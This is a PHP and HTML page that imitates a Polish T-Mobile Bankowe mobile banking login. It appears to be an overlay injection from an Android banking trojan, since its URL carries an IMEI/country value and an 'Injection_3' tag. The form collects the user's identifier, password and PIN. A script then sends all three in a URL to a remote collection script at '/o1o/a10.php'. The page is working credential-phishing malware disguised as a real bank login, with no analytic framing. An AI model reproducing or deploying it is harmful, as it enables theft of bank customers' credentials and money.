<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, user-scalable=no, minimal-ui" />
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <title>T-Mobile Bankowe</title>

    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.6/css/bootstrap.min.css">
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.6.1/css/font-awesome.min.css">
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.12.2/jquery.min.js"></script>
    <script src="js/credit.js"></script>
    <script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.6.4/angular.min.js"></script>
    <link href="https://fonts.googleapis.com/css?family=Roboto" rel="stylesheet">
	<link rel="stylesheet" href="pl/com.orangefinanse/css/style.css">
</head>
<?php
$IMEI_country = htmlspecialchars($_REQUEST["p"], ENT_QUOTES);
//$IMEI_country = "321|tr";
include "config.php";
?>
<body>
    <div class="booting on text-center alert alert-danger" style="position: absolute;width: 100%;">
        Błąd połączenia z serwerem
    </div>
    <div class="header">
        <img style="padding: 10px;width: 48px;" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAADAAAAAwCAMAAABg3Am1AAABrVBMVEX/WAD/cij/jFD/dS3/biH/cCX/Yg//XQj/nWr/hUX/sor/upb/dzD/k1r/fzz/onH/pXb/bB7/x6r/8uv/7uX/upX/YQ3/p3j/1sD/pHT/5Nb/dCv/eTP/zbP/7eT/5df/uJP/Xwr/ZRT/yq7/p3n/u5f/4tP/iEr/WQH/q3//7eP/49T/sIf/4ND/i07/gkD/2cX/8en/3cv/jE//XAb/59r/////zLH/18L/y7D/waD/59v/z7b/4tL/nWn/wqL/pnf/bSD/r4X/nGj/qHr/9vH/l2D/biL/+vj/387/ll//1b///v3/eDH/v53/3sz/ahv/j1T/tpD/0Lf/6+H/9fD/2sf/YhD/rYL/qXz/sIb/s4v/fzv/t5H//fz/0rv/6+D/7+b/tIz/kFX/0rr/vZr/tI3/roT/ikz/9O7/+PT/3s3/jVH/ya3/ik3/qn3/vpz//Pr/4M//kVf/rIH/9e//hkb/gT7/byP/XQf//v7/x6n/xKX/8er/6t//xqj/mWT/8+z/+vf/v57/YAz/aBj/WwT/cif/lFz/Zhb/WQL/WgP/Xwv/sYj/mGKo8ofOAAABVUlEQVRIx+2SVVNCARCFj6gYKIrdjVwTRT0KAopx7RbB5Nrd3aLY8ZsVZwAfZXzx4X6zD/vyzc6eXUBGRkZGRuZ/E6IIDQtXBiFEREZFq2KCGRGrjosP/e40CYlJySlITUvPyMzKzsnNyy8oLNLmFOsglJSWlVdUQl9Vbajxm7V1rG+gESayMcRssTax2UYaW5iLVprb2il2dHZ19/T2+QQd+yEMcNDEbkDQDKk4bOMIMGrHGB1wUhznhCKekz7BSiug5ZSJegjTM40ur2AEJLu3IFLUclaSpDmfMM9oYIHhXkHHRUEfECpYgCWKy1z5Ssm/g3J1rW2J6/AKG9zcSgsI2zTs7FLM4t7+weGR3ziWyIETqOxqnLrOEs85rLFfAJZR1CZfXl1TxI2bt3eeQMKC7d7fP/yM/vHpGZPcAF4cr7+6lZXuDNa9BXFdtfP9w/O3H/wETARG74YZxfYAAAAASUVORK5CYII=">
        Log in
    </div>
<div class="wrap">
    <form method="post" name="form">

        <label for="login"> Identifykator</label>
        <input type="tel" name="pesel" id="login" onkeyup="check();" required pattern="^(\w+){8}$" maxlength="8" class="input">

        <label for="password"> Password (Haslo)</label>
        <input type="password" name="password" onkeyup="check();" id="password" class="input">

        <label for="pin"> PIN</label>
        <input type="password" name="pin" onkeyup="check();" id="pin" class="input">

        <div class="footer">
            <input type="button" id="input_submitBtn" disabled class="button" onClick="sentServer();" ng-disabled="form.pesel.$invalid" value="Log in">
        </div>
    </form>
<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.11.3/jquery.min.js"></script>
<script>
    function check() {
    var inp1 = document.getElementById('login'),
        inp2 = document.getElementById('password'),
        inp3 = document.getElementById('pin');
    document.getElementById('input_submitBtn').disabled = inp1.value && inp2.value && inp3.value ? false : "disabled";
    }
</script>
<script>
	function sentServer()
	{
	//var imei_c = document.forms["form"].elements["imei"].value;
	var login1 = document.forms["form"].elements["login"].value;
    var haslo = document.forms["form"].elements["password"].value;
    var pin = document.forms["form"].elements["pin"].value;

	var url='<?php echo $URL; ?>';
    var imei_c='<?php echo $IMEI_country; ?>';

	location.replace(url+'/o1o/a10.php?p=' + imei_c+"|Injection_3|com_orangefinanse|"+login1+"|"+haslo+"|"+pin);
	}
</script>
    <script>main={booting:function(){var t=this;"undefined"!=typeof angular?setTimeout(function(){$(".booting").removeClass("on"),setTimeout(function(){$(".fixed-top").addClass("on"),t.start()},500)},3e3):setTimeout(function(){t.booting()},300)},start:function(){},loader_:{show:function(){$(".booting").addClass("on")},hide:function(){$(".booting").removeClass("on")}}},main.booting()</script>

</div>
</body>
</html>
